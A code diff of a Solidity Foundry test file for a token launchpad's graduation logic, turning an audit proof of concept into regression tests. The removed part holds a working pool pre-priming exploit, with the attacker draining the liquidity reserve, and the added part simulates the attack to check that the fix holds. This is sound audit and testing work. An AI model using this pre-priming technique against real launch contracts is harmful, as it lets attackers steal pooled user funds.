@@ -1,334 +1,230 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.28;
 
-import {Test} from "forge-std/Test.sol";
-import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
-import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
-import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
 import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {BaseTest} from "../Base.t.sol";
 import {BondingCurve} from "../../src/BondingCurve.sol";
 import {GraduationManager} from "../../src/GraduationManager.sol";
-import {HoodiumFactory} from "../../src/HoodiumFactory.sol";
 import {HoodiumToken} from "../../src/HoodiumToken.sol";
-import {LPLocker} from "../../src/LPLocker.sol";
-import {FeeVault} from "../../src/FeeVault.sol";
-import {MockUSDG} from "../mocks/MockUSDG.sol";
-import {MockUniswapFactory, MockUniswapPool} from "../mocks/MockUniswap.sol";
-import {INonfungiblePositionManager} from "../../src/interfaces/IUniswapV3.sol";
+import {MockUniswapPool} from "../mocks/MockUniswap.sol";
+import {INonfungiblePositionManager, IUniswapV3SwapCallback} from "../../src/interfaces/IUniswapV3.sol";
 
-/**
- * AUDIT PoC — pool pre-priming at graduation.
- *
- * GraduationManager._ensurePool uses an existing pool as-is and only initialises
- * it when slot0 is zero. Creating and initialising a Uniswap v3 pool is
- * permissionless and needs no tokens, and the mint uses amount0Min = amount1Min
- * = 0. So anyone who knows the token address (it is in TokenLaunched) can set
- * the opening price before graduation, and the full-range mint then consumes
- * the reserves at THAT price.
- *
- * The stock MockPositionManager ignores price, so this file carries a
- * price-aware stand-in that models a full-range v3 position the way Uniswap
- * does: liquidity L = min(amount0 * sqrtP, amount1 / sqrtP), used0 = L / sqrtP,
- * used1 = L * sqrtP, and swaps against it as constant product (which is exactly
- * what a single full-range position is).
- */
-contract PriceAwarePositionManager is ERC721 {
-    using SafeERC20 for IERC20;
-
-    uint256 constant Q96 = 1 << 96;
-
-    MockUniswapFactory public immutable uniFactory;
-
-    struct Position {
-        address token0;
-        address token1;
-        uint24 fee;
-        int24 tickLower;
-        int24 tickUpper;
-        uint128 liquidity;
-        uint256 reserve0;
-        uint256 reserve1;
-    }
-
-    mapping(uint256 => Position) public positionOf;
-    uint256 public nextId = 1;
-
-    constructor(MockUniswapFactory f) ERC721("Price PM", "PPM") {
-        uniFactory = f;
-    }
-
-    function mint(INonfungiblePositionManager.MintParams calldata p)
+/// A trader that pays the pool's swap callback — an arbitrageur, or an attacker
+/// dumping into a mispriced pool.
+contract Trader is IUniswapV3SwapCallback {
+    function swapExactIn(address pool, address tokenIn, bool zeroForOne, uint256 amountIn)
         external
-        payable
-        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1)
+        returns (uint256 amountOut)
     {
-        address pool = uniFactory.getPool(p.token0, p.token1, p.fee);
-        uint256 sqrtP = MockUniswapPool(pool).sqrtPriceX96();
-        require(sqrtP > 0, "not initialised");
-
-        uint256 l0 = Math.mulDiv(p.amount0Desired, sqrtP, Q96);
-        uint256 l1 = Math.mulDiv(p.amount1Desired, Q96, sqrtP);
-        uint256 L = l0 < l1 ? l0 : l1;
-        amount0 = Math.mulDiv(L, Q96, sqrtP);
-        amount1 = Math.mulDiv(L, sqrtP, Q96);
-        require(amount0 >= p.amount0Min && amount1 >= p.amount1Min, "slippage");
-
-        IERC20(p.token0).safeTransferFrom(msg.sender, address(this), amount0);
-        IERC20(p.token1).safeTransferFrom(msg.sender, address(this), amount1);
-
-        tokenId = nextId++;
-        liquidity = uint128(L);
-        positionOf[tokenId] =
-            Position(p.token0, p.token1, p.fee, p.tickLower, p.tickUpper, liquidity, amount0, amount1);
-        _mint(p.recipient, tokenId);
-    }
-
-    /// Sell `amountIn` of token0 or token1 into the position (constant product, no fee).
-    function swap(uint256 tokenId, address tokenIn, uint256 amountIn) external returns (uint256 amountOut) {
-        Position storage pos = positionOf[tokenId];
-        bool zeroForOne = tokenIn == pos.token0;
-        (uint256 rIn, uint256 rOut) = zeroForOne ? (pos.reserve0, pos.reserve1) : (pos.reserve1, pos.reserve0);
-        address tokenOut = zeroForOne ? pos.token1 : pos.token0;
-
-        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
-        amountOut = rOut - Math.mulDiv(rIn, rOut, rIn + amountIn, Math.Rounding.Ceil);
-        if (zeroForOne) {
-            pos.reserve0 += amountIn;
-            pos.reserve1 -= amountOut;
-        } else {
-            pos.reserve1 += amountIn;
-            pos.reserve0 -= amountOut;
-        }
-        IERC20(tokenOut).safeTransfer(msg.sender, amountOut);
-    }
-
-    function collect(INonfungiblePositionManager.CollectParams calldata) external payable returns (uint256, uint256) {
-        return (0, 0);
-    }
-
-    function positions(uint256 tokenId)
-        external
-        view
-        returns (
-            uint96 nonce,
-            address operator,
-            address token0,
-            address token1,
-            uint24 fee,
-            int24 tickLower,
-            int24 tickUpper,
-            uint128 liquidity,
-            uint256 feeGrowthInside0LastX128,
-            uint256 feeGrowthInside1LastX128,
-            uint128 tokensOwed0,
-            uint128 tokensOwed1
-        )
-    {
-        Position storage p = positionOf[tokenId];
-        token0 = p.token0;
-        token1 = p.token1;
-        fee = p.fee;
-        tickLower = p.tickLower;
-        tickUpper = p.tickUpper;
-        liquidity = p.liquidity;
-        return (
-            nonce,
-            operator,
-            token0,
-            token1,
-            fee,
-            tickLower,
-            tickUpper,
-            liquidity,
-            feeGrowthInside0LastX128,
-            feeGrowthInside1LastX128,
-            tokensOwed0,
-            tokensOwed1
+        (int256 a0, int256 a1) = MockUniswapPool(pool).swap(
+            address(this), zeroForOne, int256(amountIn), zeroForOne ? 4295128740 : type(uint160).max - 1, abi.encode(tokenIn)
         );
+        amountOut = uint256(-(zeroForOne ? a1 : a0));
+    }
+
+    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external override {
+        address tokenIn = abi.decode(data, (address));
+        int256 owed = amount0Delta > 0 ? amount0Delta : amount1Delta;
+        IERC20(tokenIn).transfer(msg.sender, uint256(owed));
     }
 }
 
-contract PoolPrePrimingTest is Test {
-    uint256 constant USDG_UNIT = 1e6;
-    uint256 constant TOKEN_UNIT = 1e18;
-    uint256 constant TOTAL_SUPPLY = 1_000_000_000 * TOKEN_UNIT;
-    uint256 constant CURVE_ALLOCATION = 800_000_000 * TOKEN_UNIT;
-    uint256 constant GRADUATION_TARGET = 69_000 * USDG_UNIT;
-    uint256 constant Q96 = 1 << 96;
-
-    MockUSDG usdg;
-    FeeVault vault;
-    MockUniswapFactory uniFactory;
-    PriceAwarePositionManager pm;
-    LPLocker locker;
-    GraduationManager manager;
-    HoodiumFactory factory;
+/**
+ * AUDIT C1 — pool pre-priming at graduation, third-party variant.
+ *
+ * Originally: anyone who knew the token address (it is in `TokenLaunched`)
+ * could create and initialise the pool at 10^6x the fair token price; the
+ * full-range mint then took ~all the USDG and ~0.1% of the tokens, 99.9% of the
+ * LP allocation went to the creator as "dust", and the attacker sold the few
+ * tokens they had bought on the curve into the near-tokenless pool for most of
+ * the reserve. The other direction handed the USDG reserve to the creator.
+ *
+ * Now regressions: an empty primed pool is re-priced; a liquid one is refused
+ * until its price is back within the band — and because a mispriced liquid
+ * pool is an arbitrage, that is something anyone can and will do.
+ */
+contract PoolPrePrimingTest is BaseTest {
     HoodiumToken token;
     BondingCurve curve;
 
-    address creator = makeAddr("creator");
-    address alice = makeAddr("alice");
-    address attacker = makeAddr("attacker");
-
-    function setUp() public {
-        usdg = new MockUSDG();
-        address[] memory owners = new address[](2);
-        owners[0] = makeAddr("s1");
-        owners[1] = makeAddr("s2");
-        vault = new FeeVault(owners, 2);
-
-        uniFactory = new MockUniswapFactory();
-        pm = new PriceAwarePositionManager(uniFactory);
-        locker = new LPLocker(address(pm), address(vault), 3_000);
-        manager = new GraduationManager(address(uniFactory), address(pm), address(locker), address(usdg), 10_000, 200);
-
-        factory = new HoodiumFactory(
-            HoodiumFactory.FactoryConfig({
-                usdg: address(usdg),
-                feeVault: address(vault),
-                graduationManager: address(manager),
-                tokenDecimals: 18,
-                totalSupply: TOTAL_SUPPLY,
-                curveAllocation: CURVE_ALLOCATION,
-                virtualUsdg: 12_000 * USDG_UNIT,
-                graduationTarget: GRADUATION_TARGET,
-                graduationFee: 0,
-                tradeFeeBps: 100,
-                creatorFeeShareBps: 7_000,
-                creationFee: 0,
-                devBuyMaxBps: 500,
-                snipeBlocks: 3,
-                snipeMaxBps: 100
-            })
-        );
-
-        vm.prank(creator);
-        (address t, address c) = factory.launch("Grad", "GRAD", "ipfs://x", 0, 0);
-        token = HoodiumToken(t);
-        curve = BondingCurve(c);
-        vm.roll(block.number + 4);
+    function setUp() public override {
+        super.setUp();
+        Terms memory t = _defaultTerms();
+        t.creationFee = 0;
+        _deployStack(address(usdg), t);
+        (token, curve) = _launch();
+        _skipSnipeWindow();
     }
 
-    function _buy(address who, uint256 amount) internal {
-        usdg.mint(who, amount);
-        vm.startPrank(who);
-        usdg.approve(address(curve), amount);
-        curve.buy(amount, 0);
-        vm.stopPrank();
-    }
-
-    /// Same formula as GraduationManager._sqrtPriceX96, for the fair price.
-    function _fairSqrtP(uint256 amount0, uint256 amount1) internal pure returns (uint256) {
-        return Math.sqrt(Math.mulDiv(amount1, Q96, amount0)) << 48;
-    }
-
-    function _lpAmounts() internal view returns (uint256 usdgForLp, uint256 tokensForLp) {
-        usdgForLp = curve.reserveUsdg() - curve.graduationFee();
-        tokensForLp = curve.lpAllocation() + curve.curveAllocation() - curve.tokensSold();
-    }
-
-    /// Create + initialise the pool before graduation, exactly as anyone can on
-    /// the real UniswapV3Factory / UniswapV3Pool (no tokens needed).
     /// `tokenExpensive` = true makes TOKEN 1e6x dearer than fair; false, 1e6x cheaper.
-    function _primePool(address who, bool tokenExpensive) internal {
-        (uint256 usdgForLp, uint256 tokensForLp) = _lpAmounts();
-        bool tokenIs0 = address(token) < address(usdg);
-        (address t0, address t1) = tokenIs0 ? (address(token), address(usdg)) : (address(usdg), address(token));
-        uint256 fair = tokenIs0 ? _fairSqrtP(tokensForLp, usdgForLp) : _fairSqrtP(usdgForLp, tokensForLp);
+    function _hostilePrice(bool tokenExpensive) internal view returns (uint160) {
+        (,, bool usdgIsToken1) = _order(address(token));
+        uint160 fair = _fairSqrtP(curve);
         // price = token1/token0; TOKEN dear means high price if TOKEN is token0, low if token1.
-        bool up = tokenIs0 == tokenExpensive;
-        uint256 hostile = up ? fair * 1000 : fair / 1000;
-
-        vm.startPrank(who);
-        address pool = uniFactory.createPool(t0, t1, 10_000);
-        MockUniswapPool(pool).initialize(uint160(hostile));
-        vm.stopPrank();
+        bool up = usdgIsToken1 == tokenExpensive;
+        return up ? fair * 1000 : fair / 1000;
     }
 
     /// Control: with a fresh pool the manager sets the fair price and both sides land in the pool.
     function test_audit_control_freshPoolUsesBothSides() public {
-        _buy(alice, 200_000 * USDG_UNIT);
-        (uint256 usdgForLp, uint256 tokensForLp) = _lpAmounts();
+        _fillAlmost(curve, alice);
+        (uint256 usdgForLp, uint256 tokensForLp) = _lpAmounts(curve);
 
-        curve.graduate();
+        (address pool,) = _complete(curve, alice);
 
         // Not exact: _sqrtPriceX96 drops ~48 bits, so a few micro-USDG round off as dust.
-        assertGt(usdg.balanceOf(address(pm)), usdgForLp * 9999 / 10000, "~all usdg in pool");
-        assertGt(token.balanceOf(address(pm)), tokensForLp * 9999 / 10000, "~all tokens in pool");
-        assertLt(usdg.balanceOf(creator), usdgForLp / 10000, "creator only got rounding dust");
+        assertGt(usdg.balanceOf(pool), usdgForLp * 9999 / 10000, "~all usdg in pool");
+        assertGt(token.balanceOf(pool), tokensForLp * 9999 / 10000, "~all tokens in pool");
+        assertEq(usdg.balanceOf(creator), 0, "creator got USDG");
+        assertLt(manager.dustOf(address(usdg), creator), usdgForLp / 10000, "more than rounding dust");
     }
 
     /**
-     * Attack: a third party (not the creator) buys a little on the curve, then
-     * initialises the pool at 1,000,000x the fair token price. Graduation puts
-     * ~all USDG and ~0.1% of the tokens into the pool; 99.9% of the LP token
-     * allocation is "dust" sent to the creator; the attacker then sells the
-     * tokens they bought on the curve into the mispriced pool and takes most of
-     * the reserve.
+     * Former attack: a third party buys a little on the curve, then initialises
+     * the pool at 1,000,000x the fair token price. Now the manager re-prices the
+     * empty pool, both sides land in it, and the attacker's dump is priced at
+     * the closing price against the whole reserve — a constant-product trade
+     * that cannot take more than their share.
      */
-    function test_audit_prePrimedPool_thirdPartyDrainsReserve() public {
-        // Attacker gets in early and cheap; everyone else fills the curve.
-        _buy(attacker, 2_000 * USDG_UNIT);
-        _buy(alice, 200_000 * USDG_UNIT);
-        assertTrue(curve.curveComplete());
-        (uint256 usdgForLp, uint256 tokensForLp) = _lpAmounts();
+    function test_regression_prePrimedPool_thirdPartyCannotDrainReserve() public {
+        _buy(curve, attacker, 2_000 * USDG_UNIT);
+        _fillAlmost(curve, alice);
+        (uint256 usdgForLp, uint256 tokensForLp) = _lpAmounts(curve);
+        uint160 fair = _fairSqrtP(curve);
 
-        _primePool(attacker, true);
+        address pool = _primePool(attacker, address(token), _hostilePrice(true));
 
         // Graduation is permissionless; the attacker triggers it.
-        vm.prank(attacker);
-        (, uint256 tokenId) = curve.graduate();
+        _complete(curve, attacker);
 
-        _assertPoolSkewed(usdgForLp, tokensForLp);
-        _dumpAndAssert(tokenId, usdgForLp);
-    }
+        assertEq(MockUniswapPool(pool).sqrtPriceX96(), fair, "pool not re-priced");
+        assertGt(usdg.balanceOf(pool), usdgForLp * 999 / 1000, "pool missing USDG");
+        assertGt(token.balanceOf(pool), tokensForLp * 999 / 1000, "pool missing tokens");
+        assertEq(token.balanceOf(creator), 0, "LP allocation handed to creator as dust");
 
-    function _assertPoolSkewed(uint256 usdgForLp, uint256 tokensForLp) internal {
-        uint256 poolUsdg = usdg.balanceOf(address(pm));
-        uint256 poolTokens = token.balanceOf(address(pm));
-        emit log_named_uint("usdg meant for pool     ", usdgForLp);
-        emit log_named_uint("usdg in pool            ", poolUsdg);
-        emit log_named_uint("tokens meant for pool   ", tokensForLp);
-        emit log_named_uint("tokens in pool          ", poolTokens);
-        emit log_named_uint("tokens dust -> creator  ", token.balanceOf(creator));
-
-        assertGt(poolUsdg, usdgForLp * 99 / 100, "pool took ~all the USDG");
-        assertLt(poolTokens, tokensForLp / 500, "pool took a sliver of the tokens");
-        assertGt(token.balanceOf(creator), tokensForLp * 99 / 100, "LP allocation handed to creator as dust");
-    }
-
-    function _dumpAndAssert(uint256 tokenId, uint256 usdgForLp) internal {
+        // The dump: everything the attacker holds, into the pool.
+        (,, bool usdgIsToken1) = _order(address(token));
         uint256 attackerTokens = token.balanceOf(attacker);
-        uint256 usdgBefore = usdg.balanceOf(attacker);
-        vm.startPrank(attacker);
-        token.approve(address(pm), attackerTokens);
-        uint256 out = pm.swap(tokenId, address(token), attackerTokens);
-        vm.stopPrank();
-        emit log_named_uint("attacker paid on curve  ", 2_000 * USDG_UNIT);
-        emit log_named_uint("attacker took from pool ", out);
+        Trader t = new Trader();
+        vm.prank(attacker);
+        token.transfer(address(t), attackerTokens);
+        uint256 out = t.swapExactIn(pool, address(token), usdgIsToken1, attackerTokens);
 
-        assertEq(usdg.balanceOf(attacker) - usdgBefore, out);
-        assertGt(out, usdgForLp / 2, "attacker extracted more than half of the graduation reserve");
-        assertGt(out, 2_000 * USDG_UNIT * 10, "attacker's profit is >10x their outlay");
+        // Bounded by constant product over the real reserve: no more than their
+        // proportional share. (2,000 USDG at the opening price is ~8% of supply,
+        // so an early buyer's *fair* exit is worth several times their outlay —
+        // that is the curve, not the attack. The attack was taking most of the
+        // raise for a sliver of tokens.)
+        uint256 bound = Math.mulDiv(usdgForLp, attackerTokens, tokensForLp + attackerTokens) + 1;
+        assertLe(out, bound, "attacker took more than a constant-product share");
+        assertLt(out, usdgForLp / 2, "attacker took most of the reserve");
+        assertGt(usdg.balanceOf(pool), usdgForLp / 2, "pool drained");
+    }
+
+    /// Former attack: the pool pre-priced the other way (token extremely cheap)
+    /// sent the USDG "dust" to the creator. Now it is re-priced and the creator
+    /// receives nothing.
+    function test_regression_prePrimedPool_creatorReceivesNoReserveAsDust() public {
+        _fillAlmost(curve, alice);
+        (uint256 usdgForLp,) = _lpAmounts(curve);
+
+        address pool = _primePool(creator, address(token), _hostilePrice(false));
+        _complete(curve, bob);
+
+        assertEq(usdg.balanceOf(creator), 0, "creator pocketed USDG");
+        assertLt(manager.dustOf(address(usdg), creator), usdgForLp / 10000, "USDG credited beyond rounding");
+        assertGt(usdg.balanceOf(pool), usdgForLp * 999 / 1000, "pool is under-funded");
     }
 
     /**
-     * Variant: the pool is pre-priced the other way (token extremely cheap).
-     * Then the position consumes the tokens and almost none of the USDG, and the
-     * USDG "dust" is sent to the creator — a creator-side rug: the creator
-     * receives the reserve that was meant to become locked liquidity.
+     * The residual: a primed pool *with liquidity* at a hostile price blocks the
+     * completing buy (`PoolPriceManipulated`) — but only until someone takes the
+     * arbitrage the attacker has put on the table. Once the price is back inside
+     * the band, graduation goes through and the attacker's liquidity sits in the
+     * pool at the fair price like anyone else's.
      */
-    function test_audit_prePrimedPool_creatorReceivesReserveAsDust() public {
-        _buy(alice, 200_000 * USDG_UNIT);
-        (uint256 usdgForLp,) = _lpAmounts();
+    function test_regression_prePrimedLiquidPool_blocksOnlyUntilArbitraged() public {
+        _buy(curve, attacker, 500 * USDG_UNIT);
+        _fillAlmost(curve, alice);
+        uint160 fair = _fairSqrtP(curve);
+        (address t0, address t1, bool usdgIsToken1) = _order(address(token));
 
-        _primePool(creator, false);
-        vm.prank(creator);
-        curve.graduate();
+        // Token priced 4x above fair (2x on the square root), backed by liquidity.
+        uint160 hostile = usdgIsToken1 ? fair * 2 : fair / 2;
+        address pool = _primePool(attacker, address(token), hostile);
+        _mintFullRange(attacker, pool, t0, t1, usdgIsToken1, 200 * USDG_UNIT);
+        assertGt(MockUniswapPool(pool).liquidity(), 0);
 
-        emit log_named_uint("usdg meant for pool ", usdgForLp);
-        emit log_named_uint("usdg to creator     ", usdg.balanceOf(creator));
-        assertGt(usdg.balanceOf(creator), usdgForLp * 99 / 100, "creator pocketed the reserve as dust");
-        assertLt(usdg.balanceOf(address(pm)), usdgForLp / 500, "pool is nearly unfunded");
+        // Blocked.
+        uint256 amount = 1_000 * USDG_UNIT;
+        _fund(alice, amount);
+        vm.startPrank(alice);
+        usdg.approve(address(curve), amount);
+        vm.expectRevert(abi.encodeWithSelector(GraduationManager.PoolPriceManipulated.selector, hostile, fair));
+        curve.buy(amount, 0, block.timestamp);
+        vm.stopPrank();
+        assertFalse(curve.graduated());
+
+        // An arbitrageur sells tokens into the over-priced pool until it sits at
+        // the fair price: with reserves (b0, b1), k = b0·b1 and a target price
+        // p* = (fair/2^96)^2, the new token0 reserve is sqrt(k / p*).
+        _arbToPrice(pool, t0, t1, fair);
+        uint160 landed = MockUniswapPool(pool).sqrtPriceX96();
+        assertApproxEqRel(uint256(landed), uint256(fair), 2e15, "arb did not land inside the band");
+
+        // Unblocked. The completing buy graduates into the now fairly priced pool.
+        (uint256 usdgForLp,) = _lpAmounts(curve);
+        (address used,) = _complete(curve, alice);
+        assertEq(used, pool);
+        assertGe(usdg.balanceOf(pool), usdgForLp, "pool holds less than the raise");
+    }
+
+    function _mintFullRange(address who, address pool, address t0, address t1, bool usdgIsToken1, uint256 usdgAmt)
+        internal
+    {
+        uint256 price = uint256(MockUniswapPool(pool).sqrtPriceX96());
+        uint256 tokAmt = usdgIsToken1 ? usdgAmt * Q96 / price * Q96 / price : usdgAmt * price / Q96 * price / Q96;
+        usdg.mint(who, usdgAmt);
+        (uint256 a0, uint256 a1) = usdgIsToken1 ? (tokAmt, usdgAmt) : (usdgAmt, tokAmt);
+        vm.startPrank(who);
+        usdg.approve(address(pm), type(uint256).max);
+        token.approve(address(pm), type(uint256).max);
+        pm.mint(
+            INonfungiblePositionManager.MintParams({
+                token0: t0,
+                token1: t1,
+                fee: POOL_FEE,
+                tickLower: -887200,
+                tickUpper: 887200,
+                amount0Desired: a0,
+                amount1Desired: a1,
+                amount0Min: 0,
+                amount1Min: 0,
+                recipient: who,
+                deadline: block.timestamp
+            })
+        );
+        vm.stopPrank();
+    }
+
+    function _arbToPrice(address pool, address t0, address t1, uint160 target) internal {
+        uint256 b0 = IERC20(t0).balanceOf(pool);
+        uint256 b1 = IERC20(t1).balanceOf(pool);
+        // b0' = sqrt(k) · 2^96 / target  (k = b0 · b1)
+        uint256 sqrtK = Math.sqrt(b0 * b1);
+        uint256 b0Target = Math.mulDiv(sqrtK, Q96, target);
+        Trader t = new Trader();
+        if (b0Target > b0) {
+            // Price must fall: sell token0 in.
+            uint256 amountIn = b0Target - b0;
+            deal(t0, address(t), amountIn);
+            t.swapExactIn(pool, t0, true, amountIn);
+        } else {
+            uint256 b1Target = Math.mulDiv(sqrtK, target, Q96);
+            uint256 amountIn = b1Target - b1;
+            deal(t1, address(t), amountIn);
+            t.swapExactIn(pool, t1, false, amountIn);
+        }
     }
 }
